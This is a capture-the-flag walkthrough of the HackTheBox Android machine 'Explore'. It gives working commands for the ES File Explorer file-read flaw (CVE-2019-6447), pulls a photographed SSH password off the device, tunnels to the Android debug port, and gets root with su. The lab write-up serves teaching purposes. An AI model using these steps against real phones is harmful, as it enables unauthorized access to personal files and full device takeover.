---
title: HTB: Explore
url: https://0xdf.gitlab.io/2021/10/30/htb-explore.html
date: 2021-10-30T13:45:00+00:00
difficulty: Easy [20]
tags: ctf, hackthebox, htb-explore, nmap, android, adb, es-file-explorer, cve-2019-6447, credentials, tunnel
---

![Explore](https://0xdfimages.gitlab.io/img/explore-cover.png)

Explore is the first Android box on HTB. There’s a relatively simple file read vulnerability in ES File Explorer that allows me to read images off the phone, including one with a password in it. With that password I’ll SSH into the phone, and access the Android debug (adb) service, where I can easily get a shell as root.

## Box Info

| Name | [Explore](https://hackthebox.com/machines/explore)  [Explore](https://hackthebox.com/machines/explore) [Play on HackTheBox](https://hackthebox.com/machines/explore) |
| --- | --- |
| Release Date | [26 Jun 2021](https://twitter.com/hackthebox_eu/status/1453738843283202062) |
| Retire Date | 30 Oct 2021 |
| OS | Android Android |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Explore |
| Radar Graph | Radar chart for Explore |
| First Blood User | 00:03:37[JoshSH JoshSH](https://app.hackthebox.com/users/269501) |
| First Blood Root | 00:18:56[jkr jkr](https://app.hackthebox.com/users/77141) |
| Creator | [bertolis bertolis](https://app.hackthebox.com/users/27897) |

## Recon - nmap

`nmap` found four open TCP ports, SSH (2222), ES File Explorer (42135), and two unknowns (38925, 59777):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.247
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 15:04 EDT
Warning: 10.10.10.247 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.247
Host is up (0.14s latency).
Not shown: 65530 closed ports
PORT      STATE    SERVICE
2222/tcp  open     EtherNetIP-1
5555/tcp  filtered freeciv
38925/tcp open     unknown
42135/tcp open     unknown
59777/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 152.79 seconds
oxdf@parrot$ nmap -p 2222,38925,42135,59777 -sCV -oA scans/nmap-tcpscripts 10.10.10.247
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-26 15:12 EDT
Nmap scan report for 10.10.10.247
Host is up (0.020s latency).

PORT      STATE SERVICE VERSION
2222/tcp  open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
38925/tcp open  unknown
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 19:16:08 GMT
|     Content-Length: 22
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line:
|   GetRequest: 
|     HTTP/1.1 412 Precondition Failed
|     Date: Sat, 26 Jun 2021 19:16:08 GMT
|     Content-Length: 0
|   HTTPOptions: 
|     HTTP/1.0 501 Not Implemented
|     Date: Sat, 26 Jun 2021 19:16:13 GMT
|     Content-Length: 29
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Method not supported: OPTIONS
|   Help: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 19:16:28 GMT
|     Content-Length: 26
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: HELP
|   RTSPRequest: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 19:16:13 GMT
|     Content-Length: 39
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     valid protocol version: RTSP/1.0
|   SSLSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 19:16:28 GMT
|     Content-Length: 73
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ?G???,???`~?
|     ??{????w????<=?o?
|   TLSSessionReq: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 19:16:28 GMT
|     Content-Length: 71
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|     ??random1random2random3random4
|   TerminalServerCookie: 
|     HTTP/1.0 400 Bad Request
|     Date: Sat, 26 Jun 2021 19:16:28 GMT
|     Content-Length: 54
|     Content-Type: text/plain; charset=US-ASCII
|     Connection: Close
|     Invalid request line: 
|_    Cookie: mstshash=nmap
42135/tcp open  http    ES File Explorer Name Response httpd
|_http-title: Site doesn't have a title (text/html).
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn't have a title (text/plain).
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2222-TCP:V=7.91%I=7%D=6/26%Time=60D77C3F%P=x86_64-pc-linux-gnu%r(NU
SF:LL,24,"SSH-2\.0-SSH\x20Server\x20-\x20Banana\x20Studio\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port38925-TCP:V=7.91%I=7%D=6/26%Time=60D77C3E%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,AA,"HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Sat,\x20
SF:26\x20Jun\x202021\x2019:16:08\x20GMT\r\nContent-Length:\x2022\r\nConten
...[snip]...
SF:e\x03\x03U\x1c\?\?random1random2random3random4\0\0\x0c\0/\0");
Service Info: Device: phone

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.13 seconds

```

`nmap` suggests 59777 might be Minecraft game server, but I don’t think that fits the Android OS. Googling for “59777 tcp”, the first results shows it’s also releatedto the ES File Explorer File Manager, and that there’s an exploit against it:

![image-20210626154750035](https://0xdfimages.gitlab.io/img/image-20210626154750035.png)

5555 came back filtered, which means I can’t connect to it, but it’s different from all the rest of the ports. 5555 is the Android debug (adb) port, so I’ll keep that in mind.

## Shell as Kristi

### CVE-2019-6447

#### Manually

CVE-2019-6447 is really just that the ES File Explorer port gives access to a lot of the system, and so if it can be contacted, a lot of information will leak from the system. [This GitHub](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln) has a nice Python script, but I can also do it with `curl`.

Just requesting that port returns an error:

```

oxdf@parrot$ curl 10.10.10.247:59777
FORBIDDEN: No directory listing.

```

The service takes a JSON POST payload with commands like `listFiles`, `listPics`, `listVideos`, etc.

`listFiles` returns a lot:

```

oxdf@parrot$ curl 10.10.10.247:59777 -d '{"command": "listFiles"}'
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", },  
{"name":"vndservice_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", },       
{"name":"vendor_seapp_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
{"name":"vendor", "time":"3/25/20 12:12:33 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"ueventd.rc", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"5.00 KB (5,122 Bytes)", }, 
{"name":"ueventd.android_x86_64.rc", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"464.00 Bytes (464 Bytes)", }, 
{"name":"system", "time":"3/25/20 12:12:31 AM", "type":"folder", "size":"4.00 KB (4,096 Bytes)", }, 
{"name":"sys", "time":"6/26/21 03:03:38 PM", "type":"folder", "size":"0.00 Bytes (0 Bytes)", },
...[snip]...

```

#### Script

Having seen how to just interact with the port over `curl`, the script makes it a bit easier to organize:

```

oxdf@parrot$ python poc.py list

######################
# Available Commands #
######################

listFiles: List all the files
listPics: List all the pictures
listVideos: List all the videos
listAudios: List all the audio files
listApps: List all the apps installed
listAppsSystem: List all the system apps
listAppsPhone: List all the phone apps
listAppsSdcard: List all the apk files in the sdcard
listAppsAll: List all the apps installed (system apps included)
getDeviceInfo: Get device info. Package name parameter is needed
appPull: Pull an app from the device
appLaunch: Launch an app. Package name parameter is needed
getAppThumbnail: Get the icon of an app. Package name parameter is needed

```

Same files come back from `listFile`:

```

oxdf@parrot$ python poc.py --cmd listFiles --host 10.10.10.247  
[*] Executing command: listFiles on 10.10.10.247
[*] Server responded with: 200
[
{"name":"lib", "time":"3/25/20 05:12:02 AM", "type":"folder", "size":"12.00 KB (12,288 Bytes)", }, 
{"name":"vndservice_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"65.00 Bytes (65 Bytes)", }, 
{"name":"vendor_service_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_seapp_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_property_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"392.00 Bytes (392 Bytes)", }, 
{"name":"vendor_hwservice_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"0.00 Bytes (0 Bytes)", }, 
{"name":"vendor_file_contexts", "time":"6/26/21 03:03:38 PM", "type":"file", "size":"6.92 KB (7,081 Bytes)", }, 
...[snip]...

```

### Find SSH Password

Enumerating this port, it’s actually the `listPics` command that helps for Explore:

```

oxdf@parrot$ curl 10.10.10.247:59777 -d '{"command": "listPics"}'
[
{"name":"concept.jpg", "time":"4/21/21 02:38:08 AM", "location":"/storage/emulated/0/DCIM/concept.jpg", "size":"135.33 KB (138,573 Bytes)", },
{"name":"anc.png", "time":"4/21/21 02:37:50 AM", "location":"/storage/emulated/0/DCIM/anc.png", "size":"6.24 KB (6,392 Bytes)", },
{"name":"creds.jpg", "time":"4/21/21 02:38:18 AM", "location":"/storage/emulated/0/DCIM/creds.jpg", "size":"1.14 MB (1,200,401 Bytes)", },
{"name":"224_anc.png", "time":"4/21/21 02:37:21 AM", "location":"/storage/emulated/0/DCIM/224_anc.png", "size":"124.88 KB (127,876 Bytes)", },
]

```

One of the images is named `creds.jpg`. I’ll get it:

```

oxdf@parrot$ python poc.py --get-file /storage/emulated/0/DCIM/creds.jpg --host 10.10.10.247
[*] Getting file: /storage/emulated/0/DCIM/creds.jpg
        from: 10.10.10.247
[*] Server responded with: 200
[*] Writing to file: creds.jpg

```

The image has kristi’s password:

[![](https://0xdfimages.gitlab.io/img/creds.jpg)](https://0xdfimages.gitlab.io/img/creds.jpg)

[*Click for full image*](https://0xdfimages.gitlab.io/img/creds.jpg)

### SSH

#### Shell

Remembering to add `-p 2222` to change the port, SSH works:

```

oxdf@parrot$ sshpass -p 'Kr1sT!5h@Rp3xPl0r3!' ssh -p 2222 kristi@10.10.10.247
Password authentication
:/ $

```

#### user.txt

There is no `/home` directory at the root of the Android os:

```

:/ $ ls
acct                   init.superuser.rc       sbin                      
bin                    init.usb.configfs.rc    sdcard                    
bugreports             init.usb.rc             sepolicy                  
cache                  init.zygote32.rc        storage                   
charger                init.zygote64_32.rc     sys                       
config                 lib                     system                    
d                      mnt                     ueventd.android_x86_64.rc 
data                   odm                     ueventd.rc                
default.prop           oem                     vendor                    
dev                    plat_file_contexts      vendor_file_contexts      
etc                    plat_hwservice_contexts vendor_hwservice_contexts 
fstab.android_x86_64   plat_property_contexts  vendor_property_contexts  
init                   plat_seapp_contexts     vendor_seapp_contexts     
init.android_x86_64.rc plat_service_contexts   vendor_service_contexts   
init.environ.rc        proc                    vndservice_contexts       
init.rc                product

```

`find . -name user.txt 2>/dev/null` doesn’t return anything. This can happen if there’s a directory that I can change through but not list, so `find` can’t recurse through.

Thinking back to where the user’s images were stored, it was in `/storage/emulated/0/`. Within `/storage/emulated`, I can’t list:

```

:/ $ cd storage/emulated/                                                      
:/storage/emulated $ ls
ls: .: Permission denied

```

But I can access `0`, and list files in there (including `user.txt`):

```

:/storage/emulated/0 $ ls
Alarms  DCIM     Movies Notifications Podcasts  backups   user.txt 
Android Download Music  Pictures      Ringtones dianxinos
:/storage/emulated/0 $ cat user.txt
f3201717************************

```

## Shell as root

### Enumeration

`netstat` shows the same ports that I noticed with `nmap`, except that now I can access 5555:

```

:/ $ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program Name
tcp6       0      0 :::42135                :::*                    LISTEN      -
tcp6       0      0 ::ffff:10.10.10.2:43159 :::*                    LISTEN      -
tcp6       0      0 :::59777                :::*                    LISTEN      -
tcp6       0      0 ::ffff:127.0.0.1:33837  :::*                    LISTEN      -
tcp6       0      0 :::2222                 :::*                    LISTEN      3659/net.xnano.android.sshserver
tcp6       0      0 :::5555                 :::*                    LISTEN      -
tcp6       0      0 ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:37684  ESTABLISHED -
tcp6       0      0 ::ffff:127.0.0.1:37684  ::ffff:127.0.0.1:5555   ESTABLISHED 3659/net.xnano.android.sshserver
tcp6       0     80 ::ffff:10.10.10.24:2222 ::ffff:10.10.14.1:53452 ESTABLISHED 3659/net.xnano.android.sshserver
tcp6       0      0 ::ffff:127.0.0.1:37686  ::ffff:127.0.0.1:5555   ESTABLISHED 3659/net.xnano.android.sshserver
tcp6       0      0 ::ffff:10.10.10.2:59777 ::ffff:10.10.14.1:54854 CLOSE_WAIT  -
tcp6       0      0 ::ffff:127.0.0.1:5555   ::ffff:127.0.0.1:37686  ESTABLISHED -

```

Given that 5555 is the debug port, that’s definitely worth checking out. I’ll reconnect SSH with `-L 5555:localhost:5555`. That will forward any traffic I send to my VM on 5555 through the SSH tunnel to Explore on 5555.

### adb

`apt install adb` will install the tools needed to interact with Android debug. `adb devices` will list the currently connected devices:

```

oxdf@parrot$ adb devices
List of devices attached

```

`adb connect [ip]` will start the connection, and it shows connected:

```

oxdf@parrot$ adb connect localhost:5555
connected to localhost:5555
oxdf@parrot$ adb devices
List of devices attached
localhost:5555  device

```

`adb shell` will drop to a shell:

```

oxdf@parrot$ adb shell
x86_64:/ $ 

```

If for some reason there are multiple devices connected from my VM, `adb -s localhost:5555 shell` will specify which to connect to.

### root

That’s still a low-priv connection. Luckily for me, when I connect over `adb`, `su` with no password will drop to root:

```

x86_64:/ $ su
:/ # id
uid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0

```

I’ll run `find` to locate the flag (as there’s no `/root`) in `/data`:

```

:/ # find / -name root.txt 2>/dev/null
/data/root.txt
:/ # cat /data/root.txt
f04fc82b************************

```